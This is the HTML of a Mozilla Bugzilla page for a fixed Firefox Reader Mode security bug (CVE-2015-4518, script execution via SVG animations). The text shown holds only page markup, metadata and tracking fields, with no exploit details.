<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1182778 - (CVE-2015-4518) Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1182778">
<meta property="og:description"
      content="RESOLVED (gijskruitbosch+bugs) in Toolkit - Reader Mode. Last updated 2018-02-28.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="--">

    <meta name="viewport" content="width=1024">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20211025.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;},&quot;string&quot;:{&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:1,&quot;login&quot;:&quot;&quot;}}">
    <title>1182778 - (CVE-2015-4518) Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1182778&amp;hide_resolved=1">
      <link rel="Show" title="Dependency Graph"
            href="/showdependencygraph.cgi?id=1182778">

      <link rel="Show" title="Bug Activity"
            href="/show_activity.cgi?id=1182778">

<link href="/static/v20211025.1/skins/yui.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/EditComments/web/styles/inline-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css">



    
<script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/jquery/jquery-min.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/yui.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/global.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/util.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/dropdown.js"></script>

      <script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g">
          YAHOO.namespace('bugzilla');
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"types\":[\"tracking\"],\"comments\":{\"cf_tracking_firefox95\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox93\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr78\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr91\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_sumo\":{\"none-needed\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_a11y_review_project_flag\":{\"requested\":\"Description:\\nPlease provide an explanation of the feature or change. Include a description of the user scenario in which it would be used and how the user would complete the task(s).\\nScreenshots and visual UI specs are welcome, but please include sufficient accompanying explanation so that blind members of the accessibility team are able to understand the feature\/change.\\n\\nHow do we test this?\\nIf there is an implementation to test, please provide instructions for testing it; e.g. setting preferences, other preparation, how to trigger the UI, etc.\\n\\nWhen will this ship?\\nTracking bug\/issue:\\nDesign documents (e.g. Product Requirements Document, UI spec):\\nEngineering lead:\\nProduct manager:\\n\\nThe accessibility team has developed the Mozilla Accessibility Release Guidelines which outline what is needed to make user interfaces accessible:\\nhttps:\/\/wiki.mozilla.org\/Accessibility\/Guidelines\\nPlease describe the accessibility guidelines you considered and what steps you\'ve taken to address them:\\n\\nDescribe any areas of concern to which you want the accessibility team to give special attention:\"},\"cf_tracking_firefox94\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox43\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_relnote\":{\"?\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"}},\"flags\":{\"tracking\":{\"cf_tracking_firefox_esr91\":\"---\",\"cf_status_firefox42\":\"fixed\",\"cf_status_firefox_esr78\":\"---\",\"cf_tracking_firefox94\":\"---\",\"cf_tracking_firefox95\":\"---\",\"cf_tracking_firefox93\":\"---\",\"cf_tracking_thunderbird_esr78\":\"---\",\"cf_status_thunderbird_esr91\":\"---\",\"cf_status_firefox_esr91\":\"---\",\"cf_status_firefox43\":\"fixed\",\"cf_status_thunderbird_esr78\":\"---\",\"cf_tracking_firefox_esr78\":\"---\",\"cf_status_firefox95\":\"---\",\"cf_status_firefox93\":\"---\",\"cf_tracking_firefox_relnote\":\"---\",\"cf_tracking_thunderbird_esr91\":\"---\",\"cf_tracking_firefox43\":\"+\",\"cf_status_firefox_esr38\":\"wontfix\",\"cf_status_firefox41\":\"wontfix\",\"cf_status_firefox94\":\"---\"},\"project\":{\"cf_root_cause\":\"---\",\"cf_webcompat_priority\":\"---\",\"cf_tracking_firefox_sumo\":\"---\",\"cf_fission_milestone\":\"---\",\"cf_a11y_review_project_flag\":\"---\"}}}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  

  
  BUGZILLA.bug_id = 1182778;
  BUGZILLA.bug_title = '1182778 - (CVE-2015-4518) Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)';
  BUGZILLA.bug_summary = 'Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)';
  BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1182778';
  BUGZILLA.bug_keywords = 'sec-moderate, wsec-xss',
  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };

  BUGZILLA.bug_secure = false;
      </script>
<script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/BugModal/web/comments.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/bugzilla-readable-status-min.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/field.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/comments.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/lib/prism.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/GoogleAnalytics/web/js/analytics.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/js/lib/md5.min.js"></script><script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g" src="/static/v20211025.1/extensions/Review/web/js/badge.js"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1182778">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1182778"><meta name="google-analytics" content="UA-36116321-3" data-location="https://bugzilla.mozilla.org/bug/show-modal" data-title="1182778 - (CVE-2015-4518) Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)">
<script async src="https://www.google-analytics.com/analytics.js"></script><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal yui-skin-sam">



<div id="wrapper">

<header id="header" role="banner">
  <div class="inner">
    <h1 id="header-title" class="title"><a href="https://bugzilla.mozilla.org/home" title="Go to home page">Bugzilla</a></h1>
    <form role="search" id="header-search" class="quicksearch" action="/buglist.cgi" data-no-csrf>
      <section class="searchbox-outer dropdown" role="combobox" aria-expanded="false" aria-haspopup="listbox"
               aria-labelledby="header-search-label" aria-owns="header-search-dropdown">
        <h2 id="header-search-label">Quick Search</h2>
        <span class="icon" aria-hidden="true"></span>
        <input role="searchbox" id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" placeholder="Search Bugs"
               title="Enter a bug number or some search terms" aria-controls="header-search-dropdown"
               aria-label="Quick Search"><div id="header-search-dropdown" class="dropdown-content right" role="listbox" style="display: none;">
  <div id="header-search-dropdown-wrapper">
  </div>
</div>
      </section>
    </form>
    <nav id="header-nav">
      <ul class="links">
        <li class="link-browse">
          <a href="/describecomponents.cgi" title="Browse bugs by component">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Browse</span>
          </a>
        </li>
        <li class="link-search">
          <a href="/query.cgi?format=advanced" title="Search bugs using various criteria">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Advanced Search</span>
          </a>
        </li>
      </ul>
      <div class="dropdown">
        <button type="button" id="header-tools-menu-button" class="dropdown-button minor" title="More tools…"
                aria-label="More tools…" aria-expanded="false" aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu" style="display:none;">
          <li role="presentation">
            <a href="/report.cgi" role="menuitem" tabindex="-1">Reports</a>
          </li>
            <li role="separator"></li>
            <li role="presentation">
              <a href="https://bmo.readthedocs.io/en/latest/" role="menuitem" tabindex="-1">Documentation</a>
            </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links">
          <li id="moz_new_account_container_top"><a href="/createaccount.cgi">New Account</a></li><li id="mini_login_container_top">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form' data-qs-suffix="_top">Log In</a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden"><span id="github_mini_login_top" class="mini_login_top">
    <form method="post" action="/github.cgi">
      <input type="hidden" name="github_secret" value="CjgE0wnS0hvdowiVTD5bkY5RCc7oE0eoDrMnMWxxSqtXG7Ie0wuDdm8J8zAQzXS7GZbNJDcUYJaoG0NYGqXlxqkoRzKl0uYOo7oKVyHZrtl3rgpTpYz5BCRgsvBu6VGAabjDnAbzXp9Wrfy6O08IzoahZwla7lDZzMHCuBOwfs2RTOpnbZMs2rnjRx4RxDmw8oU7FtjktIY6YVTu59rdv7rHkZQV2gZRQbwHHdyVj4RprHivROYqdhBNO7FY5u4s">
      <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
      <input type="image" src="/extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
  </span>

  <form action="/show_bug.cgi?id=1182778" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <input type="checkbox" id="Bugzilla_remember_top"
             name="Bugzilla_remember" value="on" class="bz_remember"
                 checked>
      <label for="Bugzilla_remember_top">Remember</label>
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
           class="check_mini_login_fields"
            id="log_in_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
<li id="forgot_container_top">
  <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
     class='show_forgot_form'
     data-qs-suffix="_top">Forgot Password</a>
  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1635622705-N9t39t-LqV_KwzVOn1b0xQL2Z9BpSTPidyuz46jH7rQ">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul><div id="header-external-links" class="dropdown first">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor" title="Mozilla"
          aria-label="Mozilla" aria-expanded="false" aria-haspopup="true" aria-controls="header-external-menu">
    <img src="/static/v20211025.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg" width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" style="display:none;">
    <li role="presentation">
      <a href="https://www.mozilla.org/" role="menuitem" tabindex="-1">Mozilla Home</a>
    </li>
    <li role="separator"></li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem" tabindex="-1">Privacy</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem" tabindex="-1">Cookies</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem" tabindex="-1">Legal</a>
    </li>
  </ul>
</div>
  </div>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary"
      title="Copy bug number and summary to your clipboard">Copy Summary</button>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1182778" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1182778" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field indent" id="field-status_summary"
>


  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1182778">Bug 1182778</a>
          <span class="edit-hide">(CVE-2015-4518)</span>
      </span>
      <span>
        <span class="bug-time-label">Opened <span class="rel-time" title="2015-07-11 06:47 PDT" data-time="1436622474">6 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2015-09-12 09:24 PDT" data-time="1442075042">6 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field indent edit-hide"
>


  
    <div class=" container">
      

      <h1 id="field-value-short_desc">Passive script execution on about:reader via SVG animations (affects: Firefox, No<wbr>Script, CSP; impact: spoofing, phishing)</h1>
    </div>

  
</div>

    <div class="field edit-show" id="field-short_desc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-short_desc">
            Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (Toolkit :: Reader Mode, defect)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field" id="field-product"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Toolkit" id="product-help-link" class="help">Product:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">Toolkit
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">Toolkit</div>
            <div class="description">The Mozilla Toolkit is a set of APIs, built on top of Gecko, which provide advanced services to XUL applications. These services include Profile Management, Chrome Registration, Browsing History, Extension and Theme Management, Application Update Service, and Safe Mode. (<a href="https://wiki.mozilla.org/Modules/Toolkit">More info</a>)</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Toolkit&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=Toolkit"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Toolkit"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-component"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Toolkit&component=Reader%20Mode#Reader%20Mode" id="component-help-link" class="help">Component:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">Reader Mode
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">Toolkit :: Reader Mode</div>
            <div class="description">The component for displaying pages in a special reader mode. Includes about:reader page and Readability article-parsing library.</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Toolkit&amp;component=Reader%20Mode&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=Toolkit&amp;component=Reader%20Mode&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=Toolkit&amp;component=Reader%20Mode"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Toolkit" data-component="Reader Mode"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-version"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-version">
            39 Branch

        </span>
    </div>

  
</div>

    <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>


  
    <div class=" container"><div class="field inline" id="field-rep_platform"
>


  
    <div class="value">
        <span id="field-value-rep_platform">
            All

        </span>
    </div>

  
</div><div class="field indent inline" id="field-op_sys"
>


  
    <div class="value">
        <span id="field-value-op_sys">
            All

        </span>
    </div>

  
</div><div class="field indent inline"
>


  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field contains-buttons" id="field-bug_type"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field" id="field-importance"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="importance-help-link" class="help">Priority:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-importance"><div class="field inline" id="field-priority"
>


  
    <div class="value">
        <span id="field-value-priority">
          <em>Not set</em>
        </span>
    </div>

  
</div><div class="field inline" id="field-bug_severity"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_severity">
            normal

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_points" style="display:none"
>
    <div class="name">Points:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_points">
            ---

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
            (<span id="readable-bug-status" data-readable-bug-status="{&quot;cf_tracking_thunderbird_esr78&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_sumo&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_a11y_review_project_flag&quot;:&quot;---&quot;,&quot;target_milestone&quot;:&quot;mozilla43&quot;,&quot;cf_tracking_firefox93&quot;:&quot;---&quot;,&quot;cf_tracking_thunderbird_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr38&quot;:&quot;wontfix&quot;,&quot;cf_tracking_firefox_relnote&quot;:&quot;---&quot;,&quot;cf_status_firefox94&quot;:&quot;---&quot;,&quot;cf_webcompat_priority&quot;:&quot;---&quot;,&quot;status&quot;:&quot;RESOLVED&quot;,&quot;flags&quot;:[{&quot;status&quot;:&quot;+&quot;,&quot;name&quot;:&quot;sec-bounty&quot;}],&quot;cf_status_firefox_esr91&quot;:&quot;---&quot;,&quot;keywords&quot;:[&quot;sec-moderate&quot;,&quot;wsec-xss&quot;],&quot;cf_status_thunderbird_esr78&quot;:&quot;---&quot;,&quot;id&quot;:1182778,&quot;cf_status_thunderbird_esr91&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_fission_milestone&quot;:&quot;---&quot;,&quot;dupe_of&quot;:null,&quot;cf_status_firefox42&quot;:&quot;fixed&quot;,&quot;cf_tracking_firefox94&quot;:&quot;---&quot;,&quot;cf_tracking_firefox95&quot;:&quot;---&quot;,&quot;priority&quot;:&quot;--&quot;,&quot;cf_tracking_firefox43&quot;:&quot;+&quot;,&quot;resolution&quot;:&quot;FIXED&quot;,&quot;cf_status_firefox41&quot;:&quot;wontfix&quot;,&quot;cf_root_cause&quot;:&quot;---&quot;,&quot;cf_status_firefox43&quot;:&quot;fixed&quot;,&quot;cf_status_firefox93&quot;:&quot;---&quot;,&quot;cf_status_firefox95&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr78&quot;:&quot;---&quot;}"></span>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-status-view"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
